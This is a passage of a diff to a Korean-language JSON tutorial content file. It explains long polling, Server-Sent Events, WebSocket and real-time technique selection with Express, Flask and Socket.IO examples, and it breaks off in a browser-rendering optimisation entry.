요청\n백엔드 (a.com/api)\n    │\n    ↓ 서버 간 요청 (SOP 없음)\n외부 API (b.com)\n\n→ SOP는 브라우저만 적용!\n```\n\n### 보안 요약\n\n```\nSOP의 핵심:\n├── 읽기 차단 (다른 출처 데이터)\n├── 쓰기 허용 (일부)\n└── 삽입 허용 (img, script 등)\n\nCORS의 역할:\n└── SOP를 합법적으로 우회\n    서버가 허용한 출처만!\n\n결론:\n└── SOP = 기본 보안\n    CORS = 필요시 허용\n```"
+      }
+    ]
+  },
+  "07_실시간/long-polling": {
+    "id": "07_실시간/long-polling",
+    "title": "Long Polling",
+    "category": "network",
+    "subCategory": "07_실시간",
+    "language": "Python",
+    "description": "Long Polling 기법의 원리를 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "⏳ Long Polling이란?",
+        "content": "## ⏳ 한 줄 요약\n> **기다렸다가 응답하기** - 새 소식 있을 때까지 서버가 응답을 보류해요!\n\n---\n\n## 💡 폴링 vs Long Polling\n\n### 일반 폴링 (Short Polling):\n```\n클라이언트: \"새 메시지?\" → 서버: \"없어\" (즉시 응답)\n(1초 대기)\n클라이언트: \"새 메시지?\" → 서버: \"없어\" (즉시 응답)\n(1초 대기)\n클라이언트: \"새 메시지?\" → 서버: \"있어!\" (즉시 응답)\n\n문제점:\n├── 불필요한 요청 많음\n├── 서버 부하\n└── 실시간성 낮음\n```\n\n### Long Polling:\n```\n클라이언트: \"새 메시지?\"\n서버: (대기중... 30초)\n서버: \"있어!\" (새 메시지 오면 응답)\n\n클라이언트: \"새 메시지?\" (바로 다시 요청)\n서버: (대기중...)\n\n장점:\n├── 불필요한 요청 감소\n├── 즉시 응답 가능\n└── 호환성 좋음\n```\n\n---\n\n## 🎯 Long Polling 동작\n\n```\n클라이언트                    서버\n    │                         │\n    │─── GET /updates ───────►│\n    │                         │ (대기...)\n    │                         │ (새 데이터 발생!)\n    │◄─── 응답: 새 데이터 ────│\n    │                         │\n    │─── GET /updates ───────►│ (바로 다시 요청)\n    │                         │ (대기...)\n    │         ...             │\n```\n\n### 비교표:\n```\n┌────────────┬────────────┬────────────┐\n│            │ Short Poll │ Long Poll  │\n├────────────┼────────────┼────────────┤\n│ 요청 빈도   │ 많음      │ 적음       │\n│ 지연 시간   │ 폴링 주기  │ 거의 즉시  │\n│ 서버 부하   │ 높음      │ 중간       │\n│ 구현 복잡도 │ 쉬움      │ 중간       │\n│ 연결 유지   │ 짧음      │ 김 (30초)  │\n└────────────┴────────────┴────────────┘\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 Long Polling 구현",
+        "content": "### 클라이언트 (JavaScript)\n\n```javascript\nasync function longPoll() {\n  try {\n    const response = await fetch('/updates', {\n      method: 'GET',\n      headers: { 'Content-Type': 'application/json' }\n    });\n\n    if (response.ok) {\n      const data = await response.json();\n      console.log('새 데이터:', data);\n\n      // 데이터 처리\n      handleUpdate(data);\n    }\n  } catch (error) {\n    console.error('에러:', error);\n    // 잠시 대기 후 재시도\n    await new Promise(r => setTimeout(r, 1000));\n  }\n\n  // 즉시 다시 요청 (재귀)\n  longPoll();\n}\n\n// 시작\nlongPoll();\n\n// 타임아웃 설정 버전\nasync function longPollWithTimeout() {\n  const controller = new AbortController();\n  const timeoutId = setTimeout(() => controller.abort(), 30000);\n\n  try {\n    const response = await fetch('/updates', {\n      signal: controller.signal\n    });\n    clearTimeout(timeoutId);\n\n    if (response.ok) {\n      const data = await response.json();\n      handleUpdate(data);\n    }\n  } catch (error) {\n    if (error.name === 'AbortError') {\n      console.log('타임아웃, 재연결...');\n    }\n  }\n\n  longPollWithTimeout();\n}\n```\n\n### 서버 (Express)\n\n```javascript\nconst express = require('express');\nconst app = express();\n\n// 대기 중인 클라이언트들\nconst waitingClients = [];\n\n// Long Polling 엔드포인트\napp.get('/updates', (req, res) => {\n  // 타임아웃 설정 (30초)\n  const timeout = setTimeout(() => {\n    // 타임아웃 시 빈 응답\n    res.json({ data: null, timeout: true });\n  }, 30000);\n\n  // 대기 목록에 추가\n  const client = { res, timeout };\n  waitingClients.push(client);\n\n  // 연결 종료 시 정리\n  req.on('close', () => {\n    clearTimeout(timeout);\n    const index = waitingClients.indexOf(client);\n    if (index > -1) {\n      waitingClients.splice(index, 1);\n    }\n  });\n});\n\n// 새 데이터 발생 시 모든 클라이언트에게 응답\nfunction notifyAll(data) {\n  while (waitingClients.length > 0) {\n    const client = waitingClients.shift();\n    clearTimeout(client.timeout);\n    client.res.json({ data, timeout: false });\n  }\n}\n\n// 예: 새 메시지 도착\napp.post('/message', (req, res) => {\n  const message = req.body;\n  notifyAll(message);  // 대기 중인 모든 클라이언트에게 전송\n  res.json({ success: true });\n});\n```\n\n### Python Flask\n\n```python\nfrom flask import Flask, jsonify, request\nimport time\nimport threading\n\napp = Flask(__name__)\nwaiting_clients = []\nlock = threading.Lock()\n\n@app.route('/updates')\ndef updates():\n    event = threading.Event()\n    data = {'result': None}\n\n    with lock:\n        waiting_clients.append((event, data))\n\n    # 30초 대기\n    has_data = event.wait(timeout=30)\n\n    with lock:\n        if (event, data) in waiting_clients:\n            waiting_clients.remove((event, data))\n\n    if has_data:\n        return jsonify(data['result'])\n    else:\n        return jsonify({'timeout': True})\n\ndef notify_all(new_data):\n    with lock:\n        for event, data in waiting_clients:\n            data['result'] = new_data\n            event.set()\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 Long Polling 팁",
+        "content": "### 사용 사례\n\n```\n1. 채팅 (WebSocket 못 쓸 때)\n2. 알림 시스템\n3. 레거시 시스템\n4. 방화벽 제약 환경\n5. 브라우저 호환성 필요\n```\n\n### 장단점\n\n```\n장점:\n├── 모든 브라우저 지원\n├── 기존 HTTP 인프라 사용\n├── 프록시/방화벽 통과 쉬움\n├── 구현 비교적 간단\n└── WebSocket 폴백용\n\n단점:\n├── WebSocket보다 오버헤드 큼\n├── 서버 연결 유지 부담\n├── 타임아웃 관리 필요\n├── 단방향 (클라이언트→서버는 별도)\n└── 확장성 제한\n```\n\n### 타임아웃 설정\n\n```\n클라이언트 타임아웃:\n├── 보통 30초\n├── 프록시 타임아웃 고려 (60초 일반적)\n└── 너무 짧으면 요청 많아짐\n\n서버 타임아웃:\n├── 클라이언트보다 약간 짧게\n├── 빈 응답 또는 keepalive 응답\n└── 연결 정리 필수\n```\n\n### 실시간 기술 선택 가이드\n\n```\n1순위: WebSocket\n├── 양방향, 효율적\n└── 대부분의 현대 앱\n\n2순위: SSE (Server-Sent Events)\n├── 단방향이면 충분할 때\n└── 간단한 구현\n\n3순위: Long Polling\n├── 레거시 환경\n├── WebSocket 차단 시\n└── 폴백 용도\n\n4순위: Short Polling\n├── 실시간성 낮아도 될 때\n└── 가장 간단한 구현\n```"
+      }
+    ]
+  },
+  "07_실시간/realtime-compare": {
+    "id": "07_실시간/realtime-compare",
+    "title": "실시간 통신 비교",
+    "category": "network",
+    "subCategory": "07_실시간",
+    "language": "Python",
+    "description": "다양한 실시간 통신 기술을 비교합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "⚡ 실시간 통신 총정리",
+        "content": "## ⚡ 한 줄 요약\n> **목적에 맞는 기술 선택** - 채팅엔 WebSocket, 알림엔 SSE, 호환성엔 Polling!\n\n---\n\n## 🎯 4가지 방식 비교\n\n### 한눈에 보기:\n```\n┌────────────┬─────────────┬──────────┬─────────┐\n│            │ Polling     │ Long     │ SSE     │ WebSocket\n│            │             │ Polling  │         │\n├────────────┼─────────────┼──────────┼─────────┤\n│ 방향       │ 단방향      │ 단방향    │ 단방향  │ 양방향\n│ 연결       │ 매번 새로   │ 유지     │ 유지    │ 유지\n│ 실시간성   │ 낮음        │ 중간     │ 높음    │ 높음\n│ 효율성     │ 낮음        │ 중간     │ 높음    │ 높음\n│ 복잡도     │ 쉬움        │ 중간     │ 쉬움    │ 중간\n│ 호환성     │ 최고        │ 좋음     │ 좋음    │ 좋음\n└────────────┴─────────────┴──────────┴─────────┘\n```\n\n### 비유로 이해하기:\n```\n📬 Polling\n└── 5분마다 우체통 확인하러 감\n\n📬 Long Polling\n└── 우체통 앞에서 편지 올 때까지 대기\n\n📺 SSE\n└── TV처럼 방송국에서 일방적으로 송출\n\n📞 WebSocket\n└── 전화처럼 양방향 실시간 대화\n```\n\n---\n\n## 🎯 상세 비교\n\n### 지연 시간:\n```\nPolling (10초 간격)\n├── 최대 10초 지연\n└── 평균 5초 지연\n\nLong Polling\n├── 거의 즉시 (< 100ms)\n└── 새 데이터 발생 시 바로 응답\n\nSSE\n├── 거의 즉시 (< 50ms)\n└── 연결 유지로 즉각 푸시\n\nWebSocket\n├── 거의 즉시 (< 50ms)\n└── 양방향 모두 즉각 전달\n```\n\n### 서버 부하:\n```\nPolling (1000명, 10초 간격)\n├── 6000 req/min\n└── 매번 연결/해제\n\nLong Polling (1000명)\n├── 1000 연결 유지\n├── 데이터 있을 때만 응답\n└── 타임아웃마다 재연결\n\nSSE/WebSocket (1000명)\n├── 1000 연결 유지\n└── 오버헤드 최소\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 상황별 코드 예시",
+        "content": "### 상황 1: 간단한 알림 → SSE\n\n```javascript\n// 서버\napp.get('/notifications', (req, res) => {\n  res.setHeader('Content-Type', 'text/event-stream');\n  res.setHeader('Cache-Control', 'no-cache');\n\n  // 새 알림 발생 시 전송\n  const sendNotification = (data) => {\n    res.write(`data: ${JSON.stringify(data)}\\n\\n`);\n  };\n\n  // 알림 이벤트 리스너 등록\n  notificationEmitter.on('new', sendNotification);\n\n  req.on('close', () => {\n    notificationEmitter.off('new', sendNotification);\n  });\n});\n\n// 클라이언트\nconst events = new EventSource('/notifications');\nevents.onmessage = (e) => showNotification(JSON.parse(e.data));\n```\n\n### 상황 2: 채팅 → WebSocket\n\n```javascript\n// 서버 (Socket.IO)\nio.on('connection', (socket) => {\n  socket.on('chat', (msg) => {\n    io.emit('chat', msg);  // 모두에게 전송\n  });\n});\n\n// 클라이언트\nconst socket = io();\nsocket.emit('chat', { text: '안녕!' });\nsocket.on('chat', (msg) => addMessage(msg));\n```\n\n### 상황 3: 레거시 호환 → Long Polling\n\n```javascript\n// 폴백 패턴\nclass RealtimeClient {\n  constructor() {\n    if (typeof WebSocket !== 'undefined') {\n      this.useWebSocket();\n    } else if (typeof EventSource !== 'undefined') {\n      this.useSSE();\n    } else {\n      this.useLongPolling();\n    }\n  }\n\n  useWebSocket() {\n    this.socket = new WebSocket('wss://example.com');\n    this.socket.onmessage = (e) => this.onMessage(e.data);\n  }\n\n  useSSE() {\n    this.eventSource = new EventSource('/events');\n    this.eventSource.onmessage = (e) => this.onMessage(e.data);\n  }\n\n  useLongPolling() {\n    const poll = async () => {\n      const res = await fetch('/poll');\n      const data = await res.json();\n      this.onMessage(data);\n      poll();\n    };\n    poll();\n  }\n\n  onMessage(data) {\n    console.log('받음:', data);\n  }\n}\n```\n\n### 상황 4: 고빈도 데이터 → WebSocket + 스로틀링\n\n```javascript\n// 주식 시세처럼 빠른 업데이트\n// 서버\nconst throttle = require('lodash/throttle');\n\n// 100ms마다 최대 1번만 전송\nconst sendPrice = throttle((price) => {\n  io.emit('price', price);\n}, 100);\n\npriceStream.on('update', sendPrice);\n\n// 클라이언트\nsocket.on('price', (price) => {\n  updateChart(price);  // UI 업데이트\n});\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 기술 선택 가이드",
+        "content": "### 결정 트리\n\n```\n양방향 필요한가?\n├── Yes → WebSocket\n└── No → 서버→클라이언트만?\n         ├── Yes → SSE (현대 브라우저)\n         │         Long Polling (레거시)\n         └── No → REST API로 충분\n```\n\n### 서비스별 추천\n\n```\n💬 채팅\n└── WebSocket (Socket.IO)\n\n🔔 알림\n└── SSE 또는 WebSocket\n\n📈 주식/코인 시세\n└── WebSocket (빈번한 업데이트)\n\n📊 대시보드\n└── SSE (서버에서 푸시)\n\n🎮 게임\n└── WebSocket (양방향, 저지연)\n\n📝 협업 도구\n└── WebSocket (실시간 동기화)\n\n🛒 이커머스 재고\n└── SSE 또는 Polling\n```\n\n### 확장성 고려\n\n```\n1000명 이하:\n└── 어떤 기술이든 OK\n\n1만명 이상:\n├── WebSocket: 연결 관리 복잡\n├── Redis Pub/Sub 사용\n└── 로드밸런서 sticky session\n\n10만명 이상:\n├── 전용 실시간 서비스 분리\n├── Kafka/RabbitMQ 사용\n└── 클러스터링 필수\n```\n\n### 비용 비교\n\n```\n개발 비용: Polling < SSE < WebSocket\n운영 비용: WebSocket < SSE < Polling\n확장 비용: SSE ≈ Polling < WebSocket\n\n결론:\n├── 간단 + 서버푸시만 → SSE\n├── 양방향 + 실시간 → WebSocket\n└── 호환성 최우선 → Long Polling\n```"
+      }
+    ]
+  },
+  "07_실시간/sse": {
+    "id": "07_실시간/sse",
+    "title": "SSE",
+    "category": "network",
+    "subCategory": "07_실시간",
+    "language": "Python",
+    "description": "Server-Sent Events로 서버 푸시를 구현합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "📡 SSE란?",
+        "content": "## 📡 한 줄 요약\n> **서버가 일방적으로 알려주기** - 뉴스 속보처럼 서버가 클라이언트에게 푸시해요!\n\n---\n\n## 💡 SSE vs WebSocket\n\n### SSE (Server-Sent Events):\n```\n📺 TV 뉴스처럼\n├── 방송국(서버) → 시청자(클라이언트)\n├── 단방향 (서버 → 클라이언트만)\n├── HTTP 사용 (간단!)\n└── 자동 재연결\n```\n\n### WebSocket:\n```\n📞 전화 통화처럼\n├── 양방향 (서버 ↔ 클라이언트)\n├── 전용 프로토콜\n├── 더 복잡\n└── 수동 재연결\n```\n\n### 선택 기준:\n```\nSSE 적합:\n├── 서버 → 클라이언트 단방향\n├── 실시간 알림\n├── 뉴스 피드\n├── 주식 시세\n└── 간단한 구현 원할 때\n\nWebSocket 적합:\n├── 양방향 필요\n├── 채팅\n├── 게임\n├── 협업 도구\n└── 복잡한 실시간 기능\n```\n\n---\n\n## 🎯 SSE 동작 방식\n\n```\n클라이언트                    서버\n    │                         │\n    │ GET /events             │\n    │ Accept: text/           │\n    │   event-stream          │\n    │────────────────────────►│\n    │                         │\n    │◄──────── 연결 유지 ──────│\n    │                         │\n    │◄──── event: update ─────│\n    │◄──── data: {...} ───────│\n    │                         │\n    │◄──── event: alert ──────│\n    │◄──── data: {...} ───────│\n    │          ...            │\n```\n\n### SSE 메시지 형식:\n```\nevent: update\ndata: {\"price\": 50000}\n\nevent: alert\ndata: {\"message\": \"급등!\"}\nid: 123\nretry: 3000\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 SSE 구현",
+        "content": "### 클라이언트 (브라우저)\n\n```javascript\n// SSE 연결\nconst eventSource = new EventSource('/events');\n\n// 기본 메시지 수신\neventSource.onmessage = (event) => {\n  console.log('메시지:', event.data);\n};\n\n// 특정 이벤트 수신\neventSource.addEventListener('update', (event) => {\n  const data = JSON.parse(event.data);\n  console.log('업데이트:', data);\n});\n\neventSource.addEventListener('alert', (event) => {\n  const data = JSON.parse(event.data);\n  alert(data.message);\n});\n\n// 연결 상태\neventSource.onopen = () => {\n  console.log('연결됨!');\n};\n\neventSource.onerror = (error) => {\n  console.error('에러:', error);\n  // 자동 재연결됨!\n};\n\n// 연결 종료\nfunction disconnect() {\n  eventSource.close();\n}\n```\n\n### 서버 (Express)\n\n```javascript\nconst express = require('express');\nconst app = express();\n\napp.get('/events', (req, res) => {\n  // SSE 헤더 설정\n  res.setHeader('Content-Type', 'text/event-stream');\n  res.setHeader('Cache-Control', 'no-cache');\n  res.setHeader('Connection', 'keep-alive');\n\n  // 클라이언트에게 이벤트 전송 함수\n  const sendEvent = (event, data) => {\n    res.write(`event: ${event}\\n`);\n    res.write(`data: ${JSON.stringify(data)}\\n\\n`);\n  };\n\n  // 환영 메시지\n  sendEvent('welcome', { message: '연결 성공!' });\n\n  // 주기적으로 데이터 전송\n  const interval = setInterval(() => {\n    sendEvent('update', {\n      time: new Date().toISOString(),\n      price: Math.random() * 100\n    });\n  }, 1000);\n\n  // 연결 종료 시 정리\n  req.on('close', () => {\n    clearInterval(interval);\n    console.log('클라이언트 연결 종료');\n  });\n});\n\napp.listen(3000);\n```\n\n### Python Flask\n\n```python\nfrom flask import Flask, Response\nimport json\nimport time\n\napp = Flask(__name__)\n\n@app.route('/events')\ndef events():\n    def generate():\n        while True:\n            data = {\n                'time': time.strftime('%H:%M:%S'),\n                'value': 123\n            }\n            yield f\"event: update\\n\"\n            yield f\"data: {json.dumps(data)}\\n\\n\"\n            time.sleep(1)\n\n    return Response(\n        generate(),\n        mimetype='text/event-stream',\n        headers={\n            'Cache-Control': 'no-cache',\n            'Connection': 'keep-alive'\n        }\n    )\n```\n\n### 인증 포함 (JWT)\n\n```javascript\n// URL 파라미터로 토큰 전달\nconst token = localStorage.getItem('token');\nconst eventSource = new EventSource(`/events?token=${token}`);\n\n// 서버에서 검증\napp.get('/events', (req, res) => {\n  const token = req.query.token;\n  const user = verifyToken(token);\n\n  if (!user) {\n    return res.status(401).send('Unauthorized');\n  }\n\n  // SSE 설정...\n});\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 SSE 실전 팁",
+        "content": "### 장단점\n\n```\n장점:\n├── 간단한 구현 (HTTP 사용)\n├── 자동 재연결 내장\n├── 브라우저 기본 지원\n├── 방화벽 통과 쉬움\n└── 적은 오버헤드\n\n단점:\n├── 단방향 (서버→클라이언트)\n├── 브라우저당 6개 연결 제한\n├── 바이너리 전송 불가\n└── IE 미지원 (폴리필 필요)\n```\n\n### 사용 사례\n\n```\n1. 실시간 알림 🔔\n2. 주식/코인 시세 📈\n3. 스포츠 경기 점수 ⚽\n4. 뉴스 피드 📰\n5. 진행률 표시 📊\n6. 로그 스트리밍 📝\n```\n\n### Last-Event-ID (재연결 시)\n\n```javascript\n// 서버: ID 포함하여 전송\nres.write(`id: 123\\n`);\nres.write(`data: {...}\\n\\n`);\n\n// 클라이언트가 재연결하면\n// Last-Event-ID: 123 헤더 자동 전송\n\n// 서버에서 확인\napp.get('/events', (req, res) => {\n  const lastId = req.headers['last-event-id'];\n  if (lastId) {\n    // 해당 ID 이후의 이벤트부터 전송\n  }\n});\n```\n\n### 재연결 간격 조정\n\n```javascript\n// 서버에서 지정\nres.write(`retry: 5000\\n\\n`); // 5초 후 재연결\n```\n\n### SSE vs 폴링 vs WebSocket\n\n```\n📊 비교표\n\n폴링: 10초마다 요청 → 10초 지연\nSSE: 즉시 푸시 → 0초 지연\nWebSocket: 즉시 푸시 → 0초 지연\n\n연결 수 (1000명 기준):\n폴링: 1000 req/10sec = 6000 req/min\nSSE: 1000 연결 유지\nWebSocket: 1000 연결 유지\n\n선택:\n├── 단방향 + 간단 → SSE ⭐\n├── 양방향 필요 → WebSocket\n└── 호환성 최우선 → 폴링\n```"
+      }
+    ]
+  },
+  "07_실시간/websocket": {
+    "id": "07_실시간/websocket",
+    "title": "WebSocket",
+    "category": "network",
+    "subCategory": "07_실시간",
+    "language": "JavaScript",
+    "description": "WebSocket 양방향 실시간 통신을 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔌 WebSocket이란?",
+        "content": "## 🔌 한 줄 요약\n> **전화 통화처럼 연결 유지** - 서버와 클라이언트가 실시간으로 대화해요!\n\n---\n\n## 💡 왜 WebSocket이 필요한가?\n\n### HTTP의 한계:\n```\nHTTP = 편지 주고받기 📬\n\n클라이언트: \"새 메시지 있어?\" → 서버: \"없어\"\n클라이언트: \"새 메시지 있어?\" → 서버: \"없어\"\n클라이언트: \"새 메시지 있어?\" → 서버: \"있어!\"\n\n→ 계속 물어봐야 함 (폴링)\n→ 비효율적! 😩\n```\n\n### WebSocket으로 해결:\n```\nWebSocket = 전화 통화 📞\n\n1. 연결 (핸드셰이크)\n2. 서버: \"새 메시지 왔어!\" (즉시 알림)\n3. 클라이언트: \"답장 보낼게!\" (즉시 전송)\n4. 연결 유지...\n\n→ 물어볼 필요 없이 바로 알림!\n→ 실시간! ⚡\n```\n\n---\n\n## 🎯 WebSocket 동작 방식\n\n### 연결 과정:\n```\n클라이언트                    서버\n    │                         │\n    │ GET /chat HTTP/1.1      │\n    │ Upgrade: websocket      │\n    │ Connection: Upgrade     │\n    │────────────────────────►│\n    │                         │\n    │ HTTP/1.1 101 Switching  │\n    │ Upgrade: websocket      │\n    │◄────────────────────────│\n    │                         │\n    │════ WebSocket 연결 ═════│\n    │                         │\n    │◄───── 메시지 ──────────►│\n    │◄───── 메시지 ──────────►│\n```\n\n### HTTP vs WebSocket:\n```\n┌─────────────┬──────────────┬──────────────┐\n│             │ HTTP         │ WebSocket    │\n├─────────────┼──────────────┼──────────────┤\n│ 연결        │ 요청마다 새로 │ 한 번 연결   │\n│ 방향        │ 단방향       │ 양방향       │\n│ 오버헤드    │ 큼 (헤더)    │ 작음         │\n│ 실시간성    │ 낮음         │ 높음         │\n│ 용도        │ 일반 웹      │ 채팅, 게임   │\n└─────────────┴──────────────┴──────────────┘\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 WebSocket 구현",
+        "content": "### 클라이언트 (브라우저)\n\n```javascript\n// WebSocket 연결\nconst socket = new WebSocket('wss://example.com/chat');\n\n// 연결 성공\nsocket.onopen = () => {\n  console.log('연결됨!');\n  socket.send('안녕하세요!');\n};\n\n// 메시지 수신\nsocket.onmessage = (event) => {\n  console.log('받은 메시지:', event.data);\n\n  // JSON 메시지인 경우\n  const data = JSON.parse(event.data);\n  console.log(data);\n};\n\n// 연결 종료\nsocket.onclose = (event) => {\n  console.log('연결 종료:', event.code, event.reason);\n};\n\n// 에러 발생\nsocket.onerror = (error) => {\n  console.error('에러:', error);\n};\n\n// 메시지 보내기\nfunction sendMessage(message) {\n  if (socket.readyState === WebSocket.OPEN) {\n    socket.send(JSON.stringify({ type: 'chat', text: message }));\n  }\n}\n\n// 연결 종료\nfunction disconnect() {\n  socket.close(1000, '정상 종료');\n}\n```\n\n### 서버 (Node.js + ws)\n\n```javascript\nconst WebSocket = require('ws');\n\nconst wss = new WebSocket.Server({ port: 8080 });\n\n// 연결된 클라이언트 목록\nconst clients = new Set();\n\nwss.on('connection', (ws) => {\n  console.log('새 클라이언트 연결');\n  clients.add(ws);\n\n  // 메시지 수신\n  ws.on('message', (message) => {\n    console.log('받은 메시지:', message.toString());\n\n    // 모든 클라이언트에게 브로드캐스트\n    clients.forEach((client) => {\n      if (client.readyState === WebSocket.OPEN) {\n        client.send(message.toString());\n      }\n    });\n  });\n\n  // 연결 종료\n  ws.on('close', () => {\n    console.log('클라이언트 연결 종료');\n    clients.delete(ws);\n  });\n\n  // 에러\n  ws.on('error', (error) => {\n    console.error('에러:', error);\n  });\n\n  // 환영 메시지\n  ws.send(JSON.stringify({ type: 'welcome', message: '연결 성공!' }));\n});\n\nconsole.log('WebSocket 서버 시작: ws://localhost:8080');\n```\n\n### Socket.IO (더 편리한 라이브러리)\n\n```javascript\n// 서버\nconst io = require('socket.io')(3000);\n\nio.on('connection', (socket) => {\n  console.log('연결:', socket.id);\n\n  // 방 입장\n  socket.join('room1');\n\n  // 이벤트 수신\n  socket.on('chat', (data) => {\n    // 특정 방에만 전송\n    io.to('room1').emit('chat', data);\n  });\n\n  socket.on('disconnect', () => {\n    console.log('연결 종료');\n  });\n});\n\n// 클라이언트\nconst socket = io('http://localhost:3000');\n\nsocket.on('connect', () => {\n  console.log('연결됨!');\n});\n\nsocket.emit('chat', { message: '안녕!' });\n\nsocket.on('chat', (data) => {\n  console.log('메시지:', data);\n});\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 WebSocket 실전 팁",
+        "content": "### 사용 사례\n\n```\n1. 채팅 앱 💬\n2. 실시간 알림 🔔\n3. 온라인 게임 🎮\n4. 주식/코인 시세 📈\n5. 협업 도구 (Google Docs) 📝\n6. IoT 대시보드 📊\n```\n\n### 연결 유지 (Heartbeat)\n\n```javascript\n// 클라이언트\nsetInterval(() => {\n  if (socket.readyState === WebSocket.OPEN) {\n    socket.send(JSON.stringify({ type: 'ping' }));\n  }\n}, 30000); // 30초마다\n\n// 서버\nws.on('message', (message) => {\n  const data = JSON.parse(message);\n  if (data.type === 'ping') {\n    ws.send(JSON.stringify({ type: 'pong' }));\n  }\n});\n```\n\n### 재연결 로직\n\n```javascript\nfunction connect() {\n  const socket = new WebSocket('wss://example.com');\n\n  socket.onclose = () => {\n    console.log('연결 끊김, 3초 후 재연결...');\n    setTimeout(connect, 3000);\n  };\n\n  socket.onerror = () => {\n    socket.close();\n  };\n}\n\nconnect();\n```\n\n### 보안 고려사항\n\n```\n1. wss:// 사용 (TLS 암호화)\n2. 인증 토큰 전송\n   ├── URL 파라미터\n   └── 첫 메시지로 전송\n3. 메시지 검증\n4. Rate limiting\n5. 연결 수 제한\n```"
+      }
+    ]
+  },
+  "08_고급/browser-rendering": {
+    "id": "08_고급/browser-rendering",
+    "title": "브라우저 렌더링",
+    "category": "network",
+    "subCategory": "08_고급",
+    "language": "Python",
+    "description": "브라우저의 렌더링 과정을 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🖼️ 브라우저 렌더링이란?",
+        "content": "## 🖼️ 한 줄 요약\n> **HTML을 화면에 그리는 과정** - 코드가 예쁜 웹페이지가 되기까지!\n\n---\n\n## 💡 왜 알아야 하나?\n\n### 프론트엔드 최적화의 핵심:\n```\n\"왜 페이지가 느려요?\"\n└── 렌더링 과정을 알면 답이 보임!\n\n\"어떻게 빠르게 만들어요?\"\n└── 렌더링 최적화 방법 적용!\n```\n\n---\n\n## 🎯 렌더링 과정 (Critical Rendering Path)\n\n### 전체 흐름:\n```\n1. HTML 파싱 → DOM 트리\n2. CSS 파싱 → CSSOM 트리\n3. DOM + CSSOM → 렌더 트리\n4. Layout (위치/크기 계산)\n5. Paint (픽셀로 그리기)\n6. Composite (레이어 합성)\n```\n\n### 상세 과정:\n\n```\n┌─────────────────────────────────────────┐\n│ 1. HTML 파싱 → DOM 트리                  │\n├─────────────────────────────────────────┤\n│ <html>                    Document       │\n│   <head>                     │           │\n│   <body>               ┌────┴────┐      │\n│     <div>             head     body      │\n│       <p>              │         │       │\n│                      title     div       │\n│                                 │        │\n│                                 p        │\n└─────────────────────────────────────────┘\n\n┌─────────────────────────────────────────┐\n│ 2. CSS 파싱 → CSSOM 트리                 │\n├─────────────────────────────────────────┤\n│ body { color: black }     CSSOM          │\n│ div { margin: 10px }        │            │\n│ p { font-size: 16px }   ┌───┴───┐       │\n│                        body    div       │\n│                         │       │        │\n│                    color:black margin    │\n└─────────────────────────────────────────┘\n\n┌─────────────────────────────────────────┐\n│ 3. 렌더 트리 (Render Tree)               │\n├─────────────────────────────────────────┤\n│ DOM + CSSOM = 화면에 보이는 것만!         │\n│                                          │\n│ display: none → 렌더 트리에서 제외!       │\n│ visibility: hidden → 포함 (공간 차지)     │\n└─────────────────────────────────────────┘\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 렌더링 최적화",
+        "content": "### 렌더링 차단 리소스\n\n```html\n<!-- 렌더링 차단: CSS -->\n<link rel=\"stylesheet\" href=\"style.css\">\n<!-- 파싱 중단, CSS 로드 대기 -->\n\n<!-- 렌더링 차단: 동기 JS -->\n<script src=\"app.js\"></script>\n<!-- 파싱 중단, JS 실행 대기 -->\n\n<!-- 해결책: async/defer -->\n<script async src=\"analytics.js\"></script>\n<!-- 비동기 로드, 즉시 실행 -->\n\n<script defer src=\"app.js\"></script>\n<!-- 비동기 로드, DOM 완성 후 실행 -->\n```\n\n### Reflow vs Repaint\n\n```javascript\n// Reflow (레이아웃 다시 계산) - 비용 높음\nelement.style.width = '100px';   // 레이아웃 변경\nelement.style.height = '200px';  // 레이아웃 변경\nelement.style.margin = '10px';   // 레이아웃 변경\n\n// Repaint (다시 그리기) - 비용 중간\nelement.style.color = 'red';     // 색상만 변경\nelement.style.background = 'blue'; // 배경만 변경\n\n// 최적화: 일괄 변경\nelement.style.cssText = 'width:100px; height:200px; margin:10px';\n// 또는\nelement.classList.add('new-style');\n```\n\n### Layout Thrashing 방지\n\n```javascript\n// 나쁜 예: 읽기/쓰기 반복\nfor (let i = 0; i < items.length; i++) {\n  items[i].style.width = container.offsetWidth + 'px';\n  // offsetWidth 읽기 → 강제 reflow\n}\n\n// 좋은 예: 읽기 먼저, 쓰기 나중\nconst width = container.offsetWidth; // 읽기\nfor (let i = 0; i < items.length; i++) {\n  items[i].style.width = width + 'px'; // 쓰기만\n}\n```\n\n### requestAnimationFrame\n\n```javascript\n// 나쁜 예: 즉시 실행\nfunction animate() {\n  element.style.left = x + 'px';\n  x += 1;\n  setTimeout(animate, 16); // 불규칙\n}\n\n// 좋은 예: 다음 프레임에 실행\nfunction animate() {\n  element.style.left = x + 'px';\n  x += 1;\n  requestAnimationFrame(animate); // 60fps 동기화\n}\n\nrequestAnimationFrame(animate);\n```\n\n### 레이어 분리 (Composite)\n\n```css\n/* GPU 가속 활성화 */\n.animated {\n  /* 별도 레이어로 분리 */\n  will-change: transform;\n  /* 또는 */\n  transform: translateZ(0);\n}\n\n/* transform, opacity만 변경 → reflow 없음! */\n.animated:hover {\n  transform: scale(1.1);\n  opacity: 0.8;\n}\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 성능 최적화 팁",
